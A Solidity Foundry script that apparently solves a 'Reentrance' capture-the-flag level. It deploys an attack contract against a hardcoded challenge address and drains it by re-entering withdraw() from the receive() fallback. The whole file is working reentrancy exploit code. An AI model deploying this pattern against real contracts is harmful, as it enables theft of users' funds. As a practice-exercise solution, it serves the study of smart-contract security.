//SPDX:License-Identifier: MIT

pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract AttackReentrance {
    Reentrance reentranceInstance = Reentrance(0x22DEf88E777a28D01d82503D6A709BB72ECF9C60);

    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }    

    function withdraw() external {
        reentranceInstance.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.002 ether}("");

    }
    receive() external payable {
        reentranceInstance.withdraw(0.001 ether);
    }
}

contract ReentrancySolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackReentrance attackReentrance = new AttackReentrance{value: 0.001 ether}();
        attackReentrance.withdraw();
        vm.stopBroadcast();
    }
}